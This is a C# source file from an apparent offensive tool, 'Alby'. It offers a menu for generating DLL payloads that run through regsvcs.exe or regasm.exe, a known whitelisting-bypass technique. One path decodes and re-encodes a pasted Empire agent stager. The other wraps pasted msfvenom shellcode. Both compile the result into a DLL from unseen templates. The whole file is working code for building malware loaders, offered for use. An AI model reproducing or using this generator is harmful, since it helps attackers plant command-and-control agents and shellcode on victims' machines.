using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Alby
{
    class RegsvcsRegasm
    {

        public static void Menu()
        {
            Helpers.AlbyAddToBanner("REGSVCS/REGASM.exe - Select Payload");
            Console.WriteLine("1. Empire Agent");
            Console.WriteLine("2. Metasploit payload");
            Console.WriteLine();
            Console.WriteLine("0.Back");
            Console.Write("\nEnter choice: ");

            int UserInput = Helpers.GenerateInputOptions(2);
            switch (UserInput)
            {
                case 1:
                    Empire();
                    break;
                case 2:
                    MetaSploit();
                    break;
                default:
                    break;
            }
        }

        private static void Empire()
        {
            string Filename_RegsvcsRegasmEmpireStagerDLL_Default = "RegsvcsRegasmEmpireStager.dll";

            Helpers.WriteEmpireExample();
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("Important! -->Only paste the base64 encoded string<--");
            Console.ResetColor();
            Console.WriteLine("Press Enter in an empty line to exit paste");

            string Empire_Stager = Helpers.PasteToString();

            /* Decode */
            string decoded = Encoding.Unicode.GetString(System.Convert.FromBase64String(Empire_Stager));
            Console.WriteLine(decoded);
            /* Replace & with . due to a bug of somekind */
            string replaced = decoded.Replace("&", ".");
            Console.WriteLine();

            /* ENCODE */
            string base64string = Convert.ToBase64String(Encoding.UTF8.GetBytes(replaced));
            Console.WriteLine();
            Empire_Stager = base64string;

            string Outfile = Helpers.FileFolderLocation(Filename_RegsvcsRegasmEmpireStagerDLL_Default);

            //Generators.GeneratePayload(Resources.Template_RegsvcsRegasm_PowerShell, Outfile, Empire_Stager, "Compile", "/r:C:\\Windows\\assembly\\GAC_MSIL\\System.Management.Automation\\1.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll /unsafe /platform:x86", null, null);
            //Generators.GeneratePayload(Resources.Template_RegsvcsRegasm_PowerShell, Outfile, Empire_Stager, "Compile", "/keyfile:meta.snk /unsafe /platform:x86", null, null);

            // meta.snk hardcoded in template - file needs to be in dir where alby is run
            Generators.GeneratePayload(Resources.Template_RegsvcsRegasm_PowerShell, Outfile, Empire_Stager, "Compile", "/unsafe /platform:x86", null, null);
            Helpers.WriteRegsvcsRegasmPayloadExample(Outfile);
            Helpers.PauseExecution();
        }

        private static void MetaSploit()
        {
            /* Default filename */
            string Filename_RegsvcsRegasmMetasploitPayloadDLL_Default = "RegsvcsRegasmMetasploitPayload.dll";

            Helpers.WriteMetasploitExample();
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("Important! --Paste entire output from msfvenom, including byte[] buf and so on--");
            Console.ResetColor();
            Console.WriteLine("Press Enter in an empty line to exit...");

            string Metasploit_Payload = Helpers.PasteToString();
            string Outfile = Helpers.FileFolderLocation(Filename_RegsvcsRegasmMetasploitPayloadDLL_Default);
            
            //Generators.GeneratePayload(Resources.Template_RegsvcsRegasm_Shellcode, Outfile, Metasploit_Payload, "Compile", "/keyfile:meta.snk /unsafe /platform:x86", null, null);
            // Seems to work without keyfile...
            Generators.GeneratePayload(Resources.Template_RegsvcsRegasm_Shellcode, Outfile, Metasploit_Payload, "Compile", "/unsafe /platform:x86", null, null);
            Helpers.WriteRegsvcsRegasmPayloadExample(Outfile);
            Helpers.PauseExecution();
        }
    }
}
